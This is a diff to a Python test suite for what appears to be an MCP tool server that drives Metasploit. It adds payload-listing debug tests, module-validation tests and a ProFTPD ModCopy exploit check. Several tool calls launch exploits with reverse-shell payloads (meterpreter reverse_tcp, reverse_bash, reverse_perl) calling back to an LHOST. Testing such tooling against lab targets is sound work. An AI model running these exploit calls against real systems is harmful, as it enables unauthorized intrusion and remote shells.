@@ -348,6 +348,178 @@ class ComprehensiveToolTester:
             validate_fn=validate
         )
     
+    async def test_list_payloads_proftpd_debug(self) -> TestResult:
+        """
+        Test 3c: Debug test for proftpd_modcopy_exec payload listing issue.
+        
+        This test investigates why list_payloads returns 0 payloads when filters are applied.
+        Tests multiple filter combinations to identify the root cause.
+        """
+        start_time = datetime.now()
+        exploit_module = "unix/ftp/proftpd_modcopy_exec"
+        test_results = []
+        
+        # Test 1: No filters (baseline - should return payloads)
+        logger.info(f"\n{'='*60}")
+        logger.info("DEBUG TEST: proftpd_modcopy_exec payload listing")
+        logger.info(f"{'='*60}")
+        logger.info("Test 1: list_payloads with exploit_module only (no filters)")
+        
+        try:
+            result1 = await self.mcp_client.call_tool("list_payloads", {
+                "exploit_module": exploit_module
+            })
+            parsed1 = self._parse_result(result1)
+            raw1 = parsed1.get("raw", parsed1) if isinstance(parsed1, dict) else parsed1
+            count1 = len(raw1) if isinstance(raw1, list) else 0
+            logger.info(f"  Result: {count1} payloads returned")
+            if isinstance(raw1, list) and count1 > 0:
+                logger.info(f"  Sample payloads: {raw1[:5]}")
+            test_results.append(("No filters", count1, raw1 if isinstance(raw1, list) else []))
+        except Exception as e:
+            logger.error(f"  Error: {e}")
+            test_results.append(("No filters", -1, f"Error: {e}"))
+        
+        # Test 2: Platform='unix' filter
+        logger.info("\nTest 2: list_payloads with exploit_module + platform='unix'")
+        try:
+            result2 = await self.mcp_client.call_tool("list_payloads", {
+                "exploit_module": exploit_module,
+                "platform": "unix"
+            })
+            parsed2 = self._parse_result(result2)
+            raw2 = parsed2.get("raw", parsed2) if isinstance(parsed2, dict) else parsed2
+            count2 = len(raw2) if isinstance(raw2, list) else 0
+            logger.info(f"  Result: {count2} payloads returned")
+            if isinstance(raw2, list) and count2 > 0:
+                logger.info(f"  Sample payloads: {raw2[:5]}")
+            test_results.append(("Platform=unix", count2, raw2 if isinstance(raw2, list) else []))
+        except Exception as e:
+            logger.error(f"  Error: {e}")
+            test_results.append(("Platform=unix", -1, f"Error: {e}"))
+        
+        # Test 3: Platform='linux' filter
+        logger.info("\nTest 3: list_payloads with exploit_module + platform='linux'")
+        try:
+            result3 = await self.mcp_client.call_tool("list_payloads", {
+                "exploit_module": exploit_module,
+                "platform": "linux"
+            })
+            parsed3 = self._parse_result(result3)
+            raw3 = parsed3.get("raw", parsed3) if isinstance(parsed3, dict) else parsed3
+            count3 = len(raw3) if isinstance(raw3, list) else 0
+            logger.info(f"  Result: {count3} payloads returned")
+            if isinstance(raw3, list) and count3 > 0:
+                logger.info(f"  Sample payloads: {raw3[:5]}")
+            test_results.append(("Platform=linux", count3, raw3 if isinstance(raw3, list) else []))
+        except Exception as e:
+            logger.error(f"  Error: {e}")
+            test_results.append(("Platform=linux", -1, f"Error: {e}"))
+        
+        # Test 4: Platform='unix' + arch='x86'
+        logger.info("\nTest 4: list_payloads with exploit_module + platform='unix' + arch='x86'")
+        try:
+            result4 = await self.mcp_client.call_tool("list_payloads", {
+                "exploit_module": exploit_module,
+                "platform": "unix",
+                "arch": "x86"
+            })
+            parsed4 = self._parse_result(result4)
+            raw4 = parsed4.get("raw", parsed4) if isinstance(parsed4, dict) else parsed4
+            count4 = len(raw4) if isinstance(raw4, list) else 0
+            logger.info(f"  Result: {count4} payloads returned")
+            if isinstance(raw4, list) and count4 > 0:
+                logger.info(f"  Sample payloads: {raw4[:5]}")
+            test_results.append(("Platform=unix, Arch=x86", count4, raw4 if isinstance(raw4, list) else []))
+        except Exception as e:
+            logger.error(f"  Error: {e}")
+            test_results.append(("Platform=unix, Arch=x86", -1, f"Error: {e}"))
+        
+        # Test 5: Platform='linux' + arch='x86'
+        logger.info("\nTest 5: list_payloads with exploit_module + platform='linux' + arch='x86'")
+        try:
+            result5 = await self.mcp_client.call_tool("list_payloads", {
+                "exploit_module": exploit_module,
+                "platform": "linux",
+                "arch": "x86"
+            })
+            parsed5 = self._parse_result(result5)
+            raw5 = parsed5.get("raw", parsed5) if isinstance(parsed5, dict) else parsed5
+            count5 = len(raw5) if isinstance(raw5, list) else 0
+            logger.info(f"  Result: {count5} payloads returned")
+            if isinstance(raw5, list) and count5 > 0:
+                logger.info(f"  Sample payloads: {raw5[:5]}")
+            test_results.append(("Platform=linux, Arch=x86", count5, raw5 if isinstance(raw5, list) else []))
+        except Exception as e:
+            logger.error(f"  Error: {e}")
+            test_results.append(("Platform=linux, Arch=x86", -1, f"Error: {e}"))
+        
+        # Test 6: Arch='x86' only (no platform filter)
+        logger.info("\nTest 6: list_payloads with exploit_module + arch='x86' (no platform)")
+        try:
+            result6 = await self.mcp_client.call_tool("list_payloads", {
+                "exploit_module": exploit_module,
+                "arch": "x86"
+            })
+            parsed6 = self._parse_result(result6)
+            raw6 = parsed6.get("raw", parsed6) if isinstance(parsed6, dict) else parsed6
+            count6 = len(raw6) if isinstance(raw6, list) else 0
+            logger.info(f"  Result: {count6} payloads returned")
+            if isinstance(raw6, list) and count6 > 0:
+                logger.info(f"  Sample payloads: {raw6[:5]}")
+            test_results.append(("Arch=x86 only", count6, raw6 if isinstance(raw6, list) else []))
+        except Exception as e:
+            logger.error(f"  Error: {e}")
+            test_results.append(("Arch=x86 only", -1, f"Error: {e}"))
+        
+        # Summary
+        logger.info(f"\n{'='*60}")
+        logger.info("DEBUG TEST SUMMARY")
+        logger.info(f"{'='*60}")
+        for test_name, count, payloads in test_results:
+            if isinstance(payloads, list) and count > 0:
+                logger.info(f"  {test_name}: {count} payloads")
+                # Show first few payload names to understand format
+                sample = [str(p)[:80] for p in payloads[:3]]
+                for p in sample:
+                    logger.info(f"    - {p}")
+            elif count == 0:
+                logger.warning(f"  {test_name}: 0 payloads (THIS IS THE PROBLEM)")
+            else:
+                logger.error(f"  {test_name}: {payloads}")
+        
+        # Determine test status
+        baseline_count = test_results[0][1] if test_results else 0
+        if baseline_count > 0:
+            # Check if filters are causing the issue
+            filtered_counts = [count for _, count, _ in test_results[1:] if count >= 0]
+            if all(c == 0 for c in filtered_counts):
+                status = TestStatus.FAILED
+                message = f"Filters are filtering out all {baseline_count} payloads. Baseline (no filters) returns {baseline_count} payloads, but all filtered queries return 0."
+            elif any(c == 0 for c in filtered_counts):
+                status = TestStatus.WARNING
+                message = f"Some filter combinations return 0 payloads. Baseline: {baseline_count}, Filtered: {filtered_counts}"
+            else:
+                status = TestStatus.PASSED
+                message = f"All filter combinations return payloads. Baseline: {baseline_count}, Filtered: {filtered_counts}"
+        else:
+            status = TestStatus.FAILED
+            message = f"Baseline query (no filters) returned {baseline_count} payloads. Exploit may not have compatible payloads or there's an issue with module.payloads call."
+        
+        duration = (datetime.now() - start_time).total_seconds()
+        
+        return TestResult(
+            tool_name="list_payloads",
+            test_name="Debug proftpd_modcopy_exec payload listing",
+            status=status,
+            message=message,
+            duration_seconds=duration,
+            details={
+                "test_results": test_results,
+                "baseline_count": baseline_count
+            }
+        )
+    
     async def test_describe_module_exploit(self) -> TestResult:
         """Test 4a: describe_module for exploit."""
         def validate(result):
@@ -441,6 +613,115 @@ class ComprehensiveToolTester:
             validate_fn=validate
         )
     
+    async def test_run_auxiliary_module_invalid_module(self) -> TestResult:
+        """Test 6b: run_auxiliary_module with invalid module name (module validation)."""
+        def validate(result):
+            # Should return error status immediately without waiting for timeout
+            if result.get("status") == "error":
+                msg = result.get("message", "")
+                if "not found" in msg.lower() or "invalid" in msg.lower():
+                    return True, "Module validation caught invalid module name"
+            return False, f"Expected error for invalid module, got: {result.get('status')} - {result.get('message', '')}"
+        
+        return await self._run_test(
+            tool_name="run_auxiliary_module",
+            test_name="Run auxiliary with invalid module (validation test)",
+            tool_args={
+                "module_name": "scanner/http/nonexistent_module_12345",
+                "options": {"RHOSTS": self.target_ip, "RPORT": 80},
+                "run_as_job": False,
+                "timeout_seconds": 60
+            },
+            expected_status="error",
+            validate_fn=validate
+        )
+    
+    async def test_run_auxiliary_module_failed_to_load(self) -> TestResult:
+        """Test 6c: run_auxiliary_module with module that fails to load (early exit detection)."""
+        def validate(result):
+            # Should detect "Failed to load module" early and return error
+            # This test uses a module that might exist but fails to load
+            if result.get("status") == "error":
+                msg = result.get("message", "").lower()
+                output = result.get("module_output", "").lower()
+                if "failed to load" in msg or "failed to load" in output:
+                    return True, "Early exit detected 'Failed to load module' error"
+                # Also accept "not found" as valid validation
+                if "not found" in msg:
+                    return True, "Module validation caught non-existent module"
+            return False, f"Expected error for failed module load, got: {result.get('status')} - {result.get('message', '')}"
+        
+        # Use a module that might not exist or fail to load
+        return await self._run_test(
+            tool_name="run_auxiliary_module",
+            test_name="Run auxiliary with module that fails to load (early exit test)",
+            tool_args={
+                "module_name": "scanner/http/show_robots",  # This module may not exist in all MSF versions
+                "options": {"RHOSTS": self.target_ip, "RPORT": 80},
+                "run_as_job": False,
+                "timeout_seconds": 60
+            },
+            expected_status="error",
+            validate_fn=validate
+        )
+    
+    async def test_run_exploit_invalid_module(self) -> TestResult:
+        """Test: run_exploit with invalid module name (module validation)."""
+        def validate(result):
+            # Should return error status immediately without waiting for timeout
+            if result.get("status") == "error":
+                msg = result.get("message", "")
+                if "not found" in msg.lower() or "invalid" in msg.lower():
+                    return True, "Module validation caught invalid module name"
+            return False, f"Expected error for invalid module, got: {result.get('status')} - {result.get('message', '')}"
+        
+        return await self._run_test(
+            tool_name="run_exploit",
+            test_name="Run exploit with invalid module (validation test)",
+            tool_args={
+                "module_name": "exploit/multi/http/nonexistent_exploit_12345",
+                "options": {"RHOSTS": self.target_ip},
+                "payload_name": "linux/x86/meterpreter/reverse_tcp",
+                "payload_options": {"LHOST": self.lhost, "LPORT": 4444},
+                "run_as_job": False,
+                "timeout_seconds": 60
+            },
+            expected_status="error",
+            validate_fn=validate
+        )
+    
+    async def test_run_exploit_failed_to_load(self) -> TestResult:
+        """Test: run_exploit with module that fails to load (early exit detection)."""
+        def validate(result):
+            # Should detect "Failed to load module" early and return error
+            if result.get("status") == "error":
+                msg = result.get("message", "").lower()
+                output = result.get("module_output", "").lower()
+                check_output = result.get("check_output", "").lower()
+                if "failed to load" in msg or "failed to load" in output or "failed to load" in check_output:
+                    return True, "Early exit detected 'Failed to load module' error"
+                # Also accept "not found" as valid validation
+                if "not found" in msg:
+                    return True, "Module validation caught non-existent module"
+            return False, f"Expected error for failed module load, got: {result.get('status')} - {result.get('message', '')}"
+        
+        # Use a module that might not exist or fail to load
+        return await self._run_test(
+            tool_name="run_exploit",
+            test_name="Run exploit with module that fails to load (early exit test)",
+            tool_args={
+                "module_name": "multi/http/cups_ipp_remote_code_execution",  # This module may not exist in all MSF versions
+                "options": {"RHOSTS": self.target_ip, "RPORT": 631},
+                "payload_name": "cmd/unix/reverse_bash",
+                "payload_options": {"LHOST": self.lhost, "LPORT": 4444},
+                "run_as_job": False,
+                "check_vulnerability": True,
+                "timeout_seconds": 60
+            },
+            expected_status="error",
+            validate_fn=validate
+        )
+    
     async def test_list_listeners_initial(self) -> TestResult:
         """Test 7: list_listeners (initial state)."""
         def validate(result):
@@ -465,7 +746,7 @@ class ComprehensiveToolTester:
             return False, f"Start listener failed: {result.get('message', 'unknown')}"
         
         # Use a different port to avoid conflicts with exploit tests
-        listener_port = self.lport + 1000
+        listener_port = self.lport + 1
         
         return await self._run_test(
             tool_name="start_listener",
@@ -595,6 +876,38 @@ class ComprehensiveToolTester:
             validate_fn=validate
         )
     
+    async def test_check_exploit_rpc_job_mode(self) -> TestResult:
+        """Test 12: check_exploit in RPC job mode."""
+        def validate(result):
+            status = result.get("status")
+            if status == "success":
+                print(result)
+                return True, f"Exploit checked: {result.get('message', '')}"
+            elif status in ["warning", "aborted"]:
+                return True, f"Exploit result: {result.get('message', '')}"
+            return False, f"Exploit failed: {result.get('message', 'unknown')}"
+        
+        # ProFTPD ModCopy exploit in RPC job mode
+        return await self._run_test(
+            tool_name="run_exploit",
+            test_name="Check ProFTPD exploit (RPC job mode)",
+            tool_args={
+                "module_name": "unix/ftp/proftpd_modcopy_exec",
+                "options": {
+                    "RHOSTS": self.target_ip,
+                    "RPORT": 80,
+                    "RPORT_FTP": 21,
+                    "SITEPATH": "/var/www/html/",
+                    "TARGETURI": "/",
+                    "TMPPATH": "/tmp"
+                },
+                "run_as_job": True,
+                "check_vulnerability": True
+            },
+            expected_status="success",
+            validate_fn=validate
+        )
+
     async def test_list_active_sessions_after_exploit(self) -> TestResult:
         """Test 13: list_active_sessions after exploit."""
         # Wait a moment for session to establish
@@ -721,10 +1034,10 @@ class ComprehensiveToolTester:
                 "payload_name": "cmd/unix/reverse_perl",
                 "payload_options": {
                     "LHOST": self.lhost,
-                    "LPORT": self.lport + 100  # Different port from RPC test
+                    "LPORT": self.lport + 2  # Different port from RPC test
                 },
                 "run_as_job": False,
-                "check_vulnerability": False,
+                "check_vulnerability": True,
                 "timeout_seconds": 120
             },
             expected_status="success",
@@ -835,27 +1148,33 @@ class ComprehensiveToolTester:
         
         # Define test sequence
         tests = [
-            self.test_health_check,
-            self.test_list_exploits_no_filter,
-            self.test_list_exploits_with_filter,
-            self.test_list_payloads_by_platform,
-            self.test_list_payloads_for_exploit,
-            self.test_describe_module_exploit,
-            self.test_describe_module_payload,
-            self.test_describe_module_auxiliary,
-            self.test_get_module_documentation,
-            self.test_run_auxiliary_module,
-            self.test_list_listeners_initial,
-            self.test_start_listener,
-            self.test_stop_job,
-            self.test_generate_payload,
-            self.test_kill_all_handler_jobs,
-            self.test_run_exploit_rpc_job_mode,
-            self.test_list_active_sessions_after_exploit,
-            self.test_send_session_command,
-            self.test_terminate_session,
-            self.test_run_exploit_console_mode,
-            self.test_run_post_module,
+            # self.test_health_check,
+            # self.test_list_exploits_no_filter,
+            # self.test_list_exploits_with_filter,
+            # self.test_list_payloads_by_platform,
+            # self.test_list_payloads_for_exploit,
+            self.test_list_payloads_proftpd_debug,
+        #     self.test_describe_module_exploit,
+        #     self.test_describe_module_payload,
+        #     self.test_describe_module_auxiliary,
+        #     self.test_get_module_documentation,
+        #     self.test_run_auxiliary_module,
+        #     self.test_run_auxiliary_module_invalid_module,  # Module validation test
+        #     self.test_run_auxiliary_module_failed_to_load,  # Early exit detection test
+        #     self.test_run_exploit_invalid_module,  # Module validation test
+        #     self.test_run_exploit_failed_to_load,  # Early exit detection test
+        #     self.test_list_listeners_initial,
+        #     self.test_start_listener,
+        #     self.test_stop_job,
+        #     self.test_generate_payload,
+        #     self.test_kill_all_handler_jobs,
+        #     self.test_check_exploit_rpc_job_mode,
+        #     self.test_run_exploit_rpc_job_mode,
+        #     self.test_list_active_sessions_after_exploit,
+        #     self.test_send_session_command,
+        #    self.test_terminate_session,
+        #      self.test_run_exploit_console_mode,
+        #     self.test_run_post_module,
             #self.test_additional_exploit_shellshock,
             self.final_cleanup
         ]
@@ -867,7 +1186,7 @@ class ComprehensiveToolTester:
                 result = await test_fn()
                 self.results.append(result)
             except Exception as e:
-                logger.error(f"Test crashed: {e}")
+                logger.error(f"Test crashed: {e}", exc_info=True)
                 self.results.append(TestResult(
                     tool_name=test_fn.__name__,
                     test_name="Test execution",
@@ -1017,5 +1336,6 @@ Examples:
 
 if __name__ == "__main__":
     sys.exit(asyncio.run(main()))
+
 
 
